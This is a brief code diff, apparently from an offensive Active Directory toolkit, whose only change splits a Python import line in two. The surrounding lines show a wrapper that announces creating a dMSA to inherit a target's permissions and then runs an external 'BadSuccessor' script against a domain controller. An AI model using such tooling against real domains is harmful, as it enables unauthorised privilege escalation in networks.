@@ -23,7 +23,8 @@ def run(args: Any) -> int:
     print("[*] Domain: {}".format(cred.domain))
     print("[*] Creates dMSA with msDS-ManagedAccountPrecededByLink → inherits target's permissions")
 
-    import subprocess, shutil
+    import subprocess
+    import shutil
     badsuccessor = shutil.which("badsuccessor") or shutil.which("BadSuccessor.py")
     if badsuccessor:
         cmd = [badsuccessor, "-dc-ip", dc_ip or "",
